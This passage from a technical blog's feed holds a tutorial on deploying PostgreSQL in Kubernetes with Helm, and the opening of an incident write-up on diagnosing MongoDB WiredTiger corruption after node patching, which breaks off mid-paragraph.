        <category label="Cpu" term="Cpu"/>
        <category label="Debugging" term="Debugging"/>
        <category label="Macos" term="Macos"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Deploying PostgresSQL in Kubernetes]]></title>
        <id>https://kbbgl.github.io/blog/pgsql-k8s</id>
        <link href="https://kbbgl.github.io/blog/pgsql-k8s"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Deploying a PostgresSQL database in a Kubernetes cluster]]></summary>
        <content type="html"><![CDATA[<p>In this tutorial we deploy a PostgresSQL database in Kubernetes cluster.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="set-up-postgres">Set Up Postgres<a href="https://kbbgl.github.io/blog/pgsql-k8s#set-up-postgres" class="hash-link" aria-label="Direct link to Set Up Postgres" title="Direct link to Set Up Postgres">​</a></h2>
<p>We first create a new namespace to hold the database-related services.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl create namespace database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kubectl config set-context </span><span class="token parameter variable" style="color:#36acaa">--current</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--namespace</span><span class="token plain"> database</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The first step is to create a <code>PersistenceVolume</code> and <code>PersistentVolumeClaim</code>:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> PersistentVolume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> postgresql</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">pv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">type</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">storageClassName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> manual</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">capacity</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">storage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 1Gi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">accessModes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> ReadWriteOnce</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">hostPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">path</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"/mnt/data"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">---</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> PersistentVolumeClaim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> postgresql</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">pv</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">claim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">storageClassName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> manual</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">accessModes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> ReadWriteOnce</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">resources</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">requests</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">storage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 1Gi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We add them to the namespace:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl apply </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> pgsql-pv.yaml</span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain">kubectl apply </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> pgsql-pvc.yaml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We then install Postgres using the <code>bitnami/postgresql</code> chart:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">helm </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> psql-test bitnami/postgresql </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">persistence.existingClaim</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">postgresql-pv-claim </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">volumePermissions.enabled</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">true </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">primary.service.type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">LoadBalancer</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can check that the database service is set up correctly by connecting to it using the <code>psql</code> client:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">POSTGRES_PASSWORD</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$(</span><span class="token variable" style="color:#36acaa">kubectl get secret </span><span class="token variable parameter variable" style="color:#36acaa">--namespace</span><span class="token variable" style="color:#36acaa"> database psql-test-postgresql </span><span class="token variable parameter variable" style="color:#36acaa">-o</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable assign-left variable" style="color:#36acaa">jsonpath</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable string" style="color:#e3116c">"{.data.postgres-password}"</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> base64 </span><span class="token variable parameter variable" style="color:#36acaa">-d</span><span class="token variable" style="color:#36acaa">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$POSTGRES_PASSWORD</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PGDeiuKIDd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kubectl run psql-test-postgresql-client-2 </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--rm</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--tty</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--restart</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'Never'</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--namespace</span><span class="token plain"> database </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--image</span><span class="token plain"> docker.io/bitnami/postgresql:16.4.0-debian-12-r0 </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--env</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"PGPASSWORD=</span><span class="token string variable" style="color:#36acaa">$POSTGRES_PASSWORD</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">--command</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    -- psql </span><span class="token parameter variable" style="color:#36acaa">--host</span><span class="token plain"> psql-test-postgresql </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> postgres </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> postgres </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5432</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Kobbi Gal (Akeyless)</name>
            <uri>https://github.com/kgal-akl</uri>
        </author>
        <category label="K8s" term="K8s"/>
        <category label="Kubernetes" term="Kubernetes"/>
        <category label="Database" term="Database"/>
        <category label="Storage" term="Storage"/>
        <category label="Postgres" term="Postgres"/>
        <category label="Web" term="Web"/>
        <category label="Webapplication" term="Webapplication"/>
        <category label="Webdevelopment" term="Webdevelopment"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fixing Production Down caused by MongoDB Corruption and Heketi/GlusterFS Failed Provisioning]]></title>
        <id>https://kbbgl.github.io/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning</id>
        <link href="https://kbbgl.github.io/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>Today I received an escalation from one of our largest and most strategic customers. Over the weekend, the customer had ‘patched’ their 3 Ubuntu 18.04 nodes running Kubernetes 1.17.  They were using <a href="https://www.gluster.org/" target="_blank" rel="noopener noreferrer"><code>glusterfs</code></a> as their shared storage class.</p>
<p>I was trying to figure out what this ‘patching’ job entailed so we could assess which step of the maintenance to focus on but could not get all the necessary details from the customer support team except for the following order of operations:</p>
<ol>
<li>They ran <code>kubectl drain</code> to prepare their 3 nodes for the patching. This ensured that all <code>Pods</code> would get evicted, including all persistent storage and services.</li>
<li>They ran kernel updates to patch security vulnerabilities.</li>
<li>They upgraded Ubuntu packages using <code>apt update&amp;&amp;apt upgrade</code>.</li>
<li>They restarted all their servers and ran <code>kubectl uncordon</code>.</li>
</ol>
<p>After they finished this maintenance job, their application was no longer loading.
They had not taken any snapshots of the system before running this ‘patch’ job so we had to figure out why the application was not available.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="salvaging-mongodb">Salvaging MongoDB<a href="https://kbbgl.github.io/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning#salvaging-mongodb" class="hash-link" aria-label="Direct link to Salvaging MongoDB" title="Direct link to Salvaging MongoDB">​</a></h2>
<p>I invited the customer to join me on a conference call so I could take a look and gather preliminary information about why the application is not running.
What I noticed when running <code>kubectl get pods</code> was that all the services were stuck on <code>Init 0/1</code>, which indicated that the execution of the first <code>initContainer</code> was terminating with non-zero return codes. All <code>initContainer</code>s were failing their connection to MongoDB as we can see from the spec of one of the <code>Pods</code> which was stuck on <code>Init</code>:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">Init Containers</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;init</span><span class="token punctuation" style="color:#393A34">-</span><span class="token key atrule" style="color:#00a4db">mongodb</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;Image</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">         busybox</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">1.30.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;Command</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;until nc </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">zv mongodb</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">service.prod 27017; do echo waiting for mongodb; sleep 2; done;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>It was pretty evident that the MongoDB service was the cause for the dependent application services inability to initialize because we saw that all 3 replica set member’s <code>Pod</code>s were in <code>Init: CrashLoopBackOff</code> state.</p>
<p>We needed to understand which <code>initContainer</code> of MongoDB was crashing. We were able to figure out why using <code>kubectl describe pod mongodb-replicaset-0</code> and <code>kubectl logs mongodb-replicaset-0 --all-containers</code>.
When running <code>kubectl describe pod mongodb-replicaset-0</code> we saw that the failing <code>initContainer</code> was one called <code>bootstrap</code>:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">Init Containers</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">bootstrap</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;Image</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">         mongo</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">3.6.8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;Command</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/work</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">dir/peer</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">finder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;Args</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">on</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">start=/init/on</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">start.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">service=mongodb</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">replicaset</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;Environment</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REPLICA_SET</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">    rs0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TIMEOUT</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">        </span><span class="token number" style="color:#36acaa">900</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This container is a simple peer finder daemon that is useful with <code>StatefulSet</code> and related use cases.
All it does is watch DNS for changes in the set of endpoints that are part of the governing service. It periodically looks up the SRV record of the DNS entry that corresponds to a Kubernetes Service which enumerates the set of peers for this the specified service. Not really helpful. So we needed to review the logs and find out what’s causing this container to fail.</p>
<p>When we ran <code>kubectl logs mongod-replicaset-0 --all-containers</code> we noticed the following error:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">E STORAGE  WiredTiger error, file:WiredTiger.wt, connection: unable to read root page from file:WiredTiger.wt: WT_ERROR: non-specific WiredTiger error</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">E STORAGE  WiredTiger error, file:WiredTiger.wt, connection: WiredTiger has failed to open its metadata</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">E STORAGE  WiredTiger error, file:WiredTiger.wt, connection: This may be due to the database files being encrypted, being from an older version or due to corruption on disk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">E STORAGE  WiredTiger error, file:WiredTiger.wt, connection: You should confirm that you have opened the database with the correct options including all encryption and compression options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">E -        WT_ERROR: non-specific WiredTiger error src\mongo\db\storage\wiredtiger\wiredtiger_kv_engine.cpp 397</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I STORAGE  WT_ERROR: non-specific WiredTiger error, terminating</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The log that immediately grabbed our attention was the following:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">E STORAGE  WiredTiger error, file:WiredTiger.wt, connection: This may be due to the database files being encrypted, being from an older version or due to corruption on disk</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Although we did not have any incriminating evidence, we were pretty sure that the server patching likely caused some data disk corruption because of an unclean shutdown of the MongoDB service.
